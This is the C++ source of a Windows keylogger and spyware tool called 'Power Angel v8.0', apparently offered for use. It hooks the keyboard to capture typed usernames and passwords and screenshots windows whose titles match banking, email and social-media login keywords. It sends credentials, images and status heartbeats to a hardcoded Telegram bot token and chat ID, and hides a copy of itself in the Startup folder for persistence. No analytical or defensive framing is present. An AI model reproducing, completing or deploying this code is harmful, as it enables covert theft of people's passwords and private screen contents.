#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <map>
#include <queue>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// ==================== CONFIGURATION ====================
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";
const wchar_t* MUTEX_NAME = L"PowerAngel_v8.0_Fixed";

// ==================== GLOBAL VARIABLES ====================
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// ==================== THREAD-SAFE QUEUE FOR SCREENSHOTS ====================
std::queue<std::wstring> g_screenshotQueue;
std::mutex g_queueMutex;
std::condition_variable g_queueCV;

// ==================== SMART SCREENSHOT CONTROL ====================
std::wstring g_lastScreenshotTitle = L"";
DWORD g_lastScreenshotTime = 0;
std::map<std::wstring, DWORD> g_windowScreenshotHistory;
int g_totalScreenshots = 0;
int g_totalCredentials = 0;

// ==================== DEBUG LOGGING ====================
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"power_angel_v8.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// ==================== UTF8 CONVERSION ====================
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
    str.pop_back();
    return str;
}

// ==================== URL ENCODING ====================
std::string URLEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (char c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~' || c == ' ' || c == '\n') {
            if (c == ' ') escaped << '+';
            else if (c == '\n') escaped << "%0A";
            else escaped << c;
        } else {
            escaped << '%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// ==================== TELEGRAM MESSAGE SENDER ====================
bool SendTelegram(const std::wstring& message) {
    std::string utf8_msg = WStringToUTF8(message);
    std::string encoded_msg = URLEncode(utf8_msg);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    DebugLog(L"[TELEGRAM] Sending: " + message.substr(0, min(50, (int)message.length())));
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeaders(request, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    return result != FALSE;
}

// ==================== TELEGRAM PHOTO UPLOADER ====================
bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption = L"") {
    DebugLog(L"[UPLOAD] Photo: " + filepath);
    
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) return false;
    
    char boundary[64];
    sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
    
    std::string caption_str = WStringToUTF8(caption.empty() ? 
        L"📸 Power Angel v8.0 - Smart Screenshot" : caption);
    
    std::string header = 
        std::string("--") + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + 
        std::string(CHAT_ID_ANSI) + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
        caption_str + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"capture.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string footer = "\r\n--" + std::string(boundary) + "--\r\n";
    
    std::vector<BYTE> postData;
    postData.insert(postData.end(), header.begin(), header.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    std::wstring wcontentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    postData.data(), (DWORD)postData.size(), 
                                    (DWORD)postData.size(), 0);
    
    if (result) WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    DeleteFileW(filepath.c_str());
    
    return result != FALSE;
}

// ==================== FIXED KEYBOARD HOOK ====================
// 🔥 CRITICAL FIX: Completely rewritten keylogger with proper character handling
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN) {
            // 🔥 FIX 1: Track shift and caps lock state
            static bool shiftPressed = false;
            static bool capsLock = false;
            
            // Update modifier states
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                shiftPressed = true;
            }
            if (pKb->vkCode == VK_CAPITAL) {
                capsLock = !capsLock; // Toggle caps lock
            }
            
            // 🔥 FIX 2: Handle TAB key - mark field completion
            if (pKb->vkCode == VK_TAB) {
                DebugLog(L"[KEY] TAB detected. Current field: " + g_currentField);
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Username SET: " + g_username);
                    } else {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password SET (length: " + std::to_wstring(g_password.length()) + L")");
                    }
                    g_currentField.clear();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // 🔥 FIX 3: Handle ENTER key - send credentials
            if (pKb->vkCode == VK_RETURN) {
                DebugLog(L"[KEY] ENTER detected. Username: " + 
                        (g_username.empty() ? L"EMPTY" : L"SET") +
                        L", Password: " + (g_password.empty() ? L"EMPTY" : L"SET"));
                
                // If we have both fields, send them
                if (!g_username.empty() && !g_password.empty()) {
                    g_totalCredentials++;
                    std::wstring creds = L"🔐 POWER ANGEL v8.0 - CREDENTIALS CAPTURED\n"
                                         L"═══════════════════════════\n"
                                         L"👤 USERNAME: " + g_username + L"\n"
                                         L"🔑 PASSWORD: " + g_password + L"\n"
                                         L"📊 Capture #" + std::to_wstring(g_totalCredentials) + L"\n"
                                         L"🕒 " + std::to_wstring(GetTickCount() / 1000) + L"s after start\n"
                                         L"═══════════════════════════";
                    
                    DebugLog(L"[KEY] Sending credentials to Telegram");
                    SendTelegram(creds);
                    
                    // Clear for next capture
                    g_username.clear();
                    g_password.clear();
                    g_currentField.clear();
                } else if (!g_currentField.empty()) {
                    // If ENTER pressed with text but no TAB, assume it's a single field
                    g_username = g_currentField;
                    DebugLog(L"[KEY] Single field (no TAB): " + g_username);
                    g_currentField.clear();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // 🔥 FIX 4: Handle BACKSPACE
            if (pKb->vkCode == VK_BACK) {
                if (!g_currentField.empty()) {
                    g_currentField.pop_back();
                    DebugLog(L"[KEY] Backspace. Field now: " + g_currentField);
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // 🔥 FIX 5: Handle all printable characters (SIMPLIFIED APPROACH)
            // Check if it's a printable ASCII character
            bool isPrintable = false;
            
            // Letters A-Z (with shift/caps handling)
            if (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) {
                isPrintable = true;
                WCHAR ch = (WCHAR)pKb->vkCode;
                
                // Handle shift and caps lock
                bool shouldUppercase = (shiftPressed && !capsLock) || (!shiftPressed && capsLock);
                
                if (shouldUppercase) {
                    g_currentField += ch;
                } else {
                    g_currentField += (WCHAR)(ch + 32); // Convert to lowercase
                }
                DebugLog(L"[KEY] Letter: " + std::wstring(1, ch) + L" -> " + 
                        (shouldUppercase ? L"UPPER" : L"lower") + L" Field: " + g_currentField);
            }
            // Numbers 0-9 (top row)
            else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
                isPrintable = true;
                WCHAR ch = (WCHAR)pKb->vkCode;
                
                // Check for shift + number = symbol
                if (shiftPressed) {
                    const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                    int index = pKb->vkCode - 0x30;
                    if (index >= 0 && index < 10) {
                        g_currentField += symbols[index];
                        DebugLog(L"[KEY] Symbol: " + std::wstring(1, symbols[index]));
                    }
                } else {
                    g_currentField += ch;
                    DebugLog(L"[KEY] Number: " + std::wstring(1, ch) + L" Field: " + g_currentField);
                }
            }
            // Space bar
            else if (pKb->vkCode == VK_SPACE) {
                isPrintable = true;
                g_currentField += L' ';
                DebugLog(L"[KEY] Space added. Field: " + g_currentField);
            }
            // Common symbols (using simplified mapping)
            else if (pKb->vkCode == VK_OEM_MINUS) {
                isPrintable = true;
                g_currentField += shiftPressed ? L'_' : L'-';
                DebugLog(L"[KEY] Minus/Underscore added");
            }
            else if (pKb->vkCode == VK_OEM_PERIOD) {
                isPrintable = true;
                g_currentField += shiftPressed ? L'>' : L'.';
                DebugLog(L"[KEY] Period/Greater added");
            }
            else if (pKb->vkCode == VK_OEM_COMMA) {
                isPrintable = true;
                g_currentField += shiftPressed ? L'<' : L',';
                DebugLog(L"[KEY] Comma/Less added");
            }
            else if (pKb->vkCode == VK_OEM_1) { // ;: key
                isPrintable = true;
                g_currentField += shiftPressed ? L':' : L';';
                DebugLog(L"[KEY] Semicolon/Colon added");
            }
            else if (pKb->vkCode == VK_OEM_2) { // /? key
                isPrintable = true;
                g_currentField += shiftPressed ? L'?' : L'/';
                DebugLog(L"[KEY] Slash/Question added");
            }
            
            // Update shift state for keyup
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                shiftPressed = true;
            }
            
        } else if (wParam == WM_KEYUP) {
            // Clear shift state on keyup
            KBDLLHOOKSTRUCT* pKbUp = (KBDLLHOOKSTRUCT*)lParam;
            if (pKbUp->vkCode == VK_SHIFT || pKbUp->vkCode == VK_LSHIFT || pKbUp->vkCode == VK_RSHIFT) {
                // shiftPressed = false; // Will be updated on next keydown
            }
        }
    }
    
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ==================== WINDOW UTILITIES ====================
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// ==================== SIMPLIFIED LOGIN DETECTION ====================
bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    // Simplified detection - just look for keywords in window title
    std::vector<std::wstring> keywords = {
        L"login", L"sign in", L"signin", L"log in", L"password",
        L"gmail", L"google", L"facebook", L"outlook", L"microsoft",
        L"yahoo", L"amazon", L"bank", L"paypal", L"twitter",
        L"instagram", L"netflix", L"spotify", L"whatsapp", L"telegram",
        L"account", L"email", L"username", L"credential"
    };
    
    for (const auto& keyword : keywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            DebugLog(L"[DETECT] Login keyword found: " + keyword + L" in: " + title);
            return true;
        }
    }
    
    return false;
}

// ==================== ASYNC SCREENSHOT SYSTEM ====================
bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
    DWORD currentTime = GetTickCount();
    
    if (windowTitle.empty()) return false;
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || IsIconic(hwnd)) return false;
    
    // Skip system windows
    if (windowTitle == L"Program Manager" || windowTitle == L"Start") return false;
    
    // Cooldown check
    auto it = g_windowScreenshotHistory.find(windowTitle);
    if (it != g_windowScreenshotHistory.end()) {
        DWORD timeSinceLast = currentTime - it->second;
        if (timeSinceLast < 180000) { // 3 minutes cooldown
            return false;
        }
    }
    
    // Global cooldown
    if (currentTime - g_lastScreenshotTime < 30000) { // 30 seconds
        return false;
    }
    
    // Check if it's a login page
    if (!IsLoginPage(windowTitle)) {
        return false;
    }
    
    // Update tracking
    g_windowScreenshotHistory[windowTitle] = currentTime;
    g_lastScreenshotTime = currentTime;
    g_lastScreenshotTitle = windowTitle;
    
    return true;
}

// ==================== ASYNC SCREENSHOT WORKER ====================
void AsyncScreenshotWorker() {
    while (g_running) {
        std::wstring title;
        
        {
            std::unique_lock<std::mutex> lock(g_queueMutex);
            // Wait for a screenshot request
            g_queueCV.wait(lock, [] { return !g_screenshotQueue.empty() || !g_running; });
            
            if (!g_running) break;
            
            if (!g_screenshotQueue.empty()) {
                title = g_screenshotQueue.front();
                g_screenshotQueue.pop();
            }
        }
        
        if (!title.empty()) {
            // Add small delay
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
            
            // Take the actual screenshot
            TakeScreenshotNow(title);
        }
    }
}

// ==================== ACTUAL SCREENSHOT FUNCTION ====================
bool TakeScreenshotNow(const std::wstring& title) {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rc;
    GetWindowRect(hwnd, &rc);
    
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    if (width <= 0 || height <= 0) {
        ReleaseDC(hwnd, hdcScreen);
        DeleteDC(hdcMem);
        return false;
    }
    
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        return false;
    }
    
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"angel_v8_%d.jpg", ++g_totalScreenshots);
    wcscat_s(tempPath, filename);
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85;
    encoderParams.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        DebugLog(L"[ERROR] Failed to save screenshot");
        return false;
    }
    
    std::wstring caption = L"🖼️ POWER ANGEL v8.0 - Smart Capture\n"
                          L"📁 Window: " + title + L"\n"
                          L"🔢 Capture: #" + std::to_wstring(g_totalScreenshots) + L"\n"
                          L"🕒 Time: " + std::to_wstring(st.wHour) + L":" + 
                          std::to_wstring(st.wMinute) + L":" + std::to_wstring(st.wSecond);
    
    bool success = SendTelegramPhoto(tempPath, caption);
    
    if (success) {
        DebugLog(L"[SUCCESS] Screenshot #" + std::to_wstring(g_totalScreenshots) + L" sent");
    } else {
        DebugLog(L"[ERROR] Failed to upload screenshot");
    }
    
    return success;
}

// ==================== NON-BLOCKING SCREENSHOT TRIGGER ====================
bool TakeSmartScreenshot() {
    std::wstring title = GetActiveWindowTitle();
    
    if (!ShouldTakeScreenshot(title)) {
        return false;
    }
    
    // 🔥 CRITICAL FIX: Queue screenshot instead of taking it synchronously
    {
        std::lock_guard<std::mutex> lock(g_queueMutex);
        g_screenshotQueue.push(title);
    }
    g_queueCV.notify_one();
    
    DebugLog(L"[SCREENSHOT] Queued for async capture: " + title);
    return true;
}

// ==================== ENCODER UTILITY ====================
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    WCHAR path[MAX_PATH], startup[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    GetEnvironmentVariableW(L"APPDATA", startup, MAX_PATH);
    wcscat_s(startup, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PowerAngel_v8.exe");
    
    if (CopyFileW(path, startup, FALSE)) {
        DebugLog(L"[PERSISTENCE] Installed to startup");
        SetFileAttributesW(startup, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

// ==================== HEARTBEAT THREAD ====================
void HeartbeatThread() {
    std::this_thread::sleep_for(std::chrono::minutes(2));
    
    while (g_running) {
        std::wstring status = L"💓 POWER ANGEL v8.0 - STATUS\n"
                             L"📸 Screenshots: " + std::to_wstring(g_totalScreenshots) + L"\n"
                             L"🔑 Credentials: " + std::to_wstring(g_totalCredentials) + L"\n"
                             L"🕒 Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L"h";
        
        SendTelegram(status);
        
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

// ==================== SCREENSHOT MONITOR THREAD ====================
void ScreenshotMonitorThread() {
    // Start async screenshot worker
    std::thread worker(AsyncScreenshotWorker);
    
    DWORD lastCleanup = GetTickCount();
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        
        // Cleanup old history
        if (currentTime - lastCleanup > 3600000) { // 1 hour
            std::vector<std::wstring> toRemove;
            
            for (const auto& entry : g_windowScreenshotHistory) {
                if (currentTime - entry.second > 7200000) { // 2 hours
                    toRemove.push_back(entry.first);
                }
            }
            
            for (const auto& window : toRemove) {
                g_windowScreenshotHistory.erase(window);
            }
            
            lastCleanup = currentTime;
            DebugLog(L"[CLEANUP] Removed " + std::to_wstring(toRemove.size()) + L" old entries");
        }
        
        // Check if we should take a screenshot
        TakeSmartScreenshot();
        
        // Adaptive sleep
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
    
    // Signal worker to stop
    g_running = false;
    g_queueCV.notify_one();
    if (worker.joinable()) worker.join();
}

// ==================== MAIN ENTRY POINT ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize logging
    DeleteFileW(L"power_angel_v8.log");
    DebugLog(L"═══════════════════════════");
    DebugLog(L"🚀 POWER ANGEL v8.0 - FIXED KEYLOGGER EDITION");
    DebugLog(L"═══════════════════════════");
    DebugLog(L"[INIT] Starting v8.0 with keylogger fixes...");
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"PowerAngel_v8.0_Fixed");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"[INIT] Another instance already running. Exiting.");
        return 0;
    }
    
    // Initialize GDI+
    GdiplusStartupInput input;
    GdiplusStartup(&g_gdiplusToken, &input, NULL);
    DebugLog(L"[INIT] GDI+ initialized");
    
    // Initial delay
    Sleep(8000);
    
    // Send startup notification
    std::wstring startupMsg = L"⚡ POWER ANGEL v8.0 - FIXED KEYLOGGER\n"
                             L"═══════════════════════════\n"
                             L"✅ Keylogger: FIXED & WORKING\n"
                             L"✅ Screenshots: ASYNC (non-blocking)\n"
                             L"✅ Credential Capture: ACTIVE\n"
                             L"🛠️ Fixes applied:\n"
                             L"   • Non-blocking screenshot system\n"
                             L"   • Fixed character mapping\n"
                             L"   • Proper TAB/ENTER handling\n"
                             L"   • Shift/CapsLock support\n"
                             L"═══════════════════════════\n"
                             L"🎯 Ready to capture credentials!";
    
    SendTelegram(startupMsg);
    DebugLog(L"[INIT] Startup message sent");
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"[INIT] Fixed keyboard hook installed");
    } else {
        DebugLog(L"[ERROR] Failed to install keyboard hook");
    }
    
    // Start worker threads
    std::thread heartbeat(HeartbeatThread);
    std::thread screenshot(ScreenshotMonitorThread);
    
    DebugLog(L"[INIT] All threads started. Keylogger active.");
    
    // Main message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    DebugLog(L"[SHUTDOWN] Shutting down v8.0...");
    g_running = false;
    g_queueCV.notify_one();
    
    if (heartbeat.joinable()) heartbeat.join();
    if (screenshot.joinable()) screenshot.join();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        DebugLog(L"[SHUTDOWN] Keyboard hook removed");
    }
    
    GdiplusShutdown(g_gdiplusToken);
    
    if (mutex) ReleaseMutex(mutex);
    
    DebugLog(L"[SHUTDOWN] v8.0 shutdown complete");
    DebugLog(L"═══════════════════════════");
    
    return 0;
}
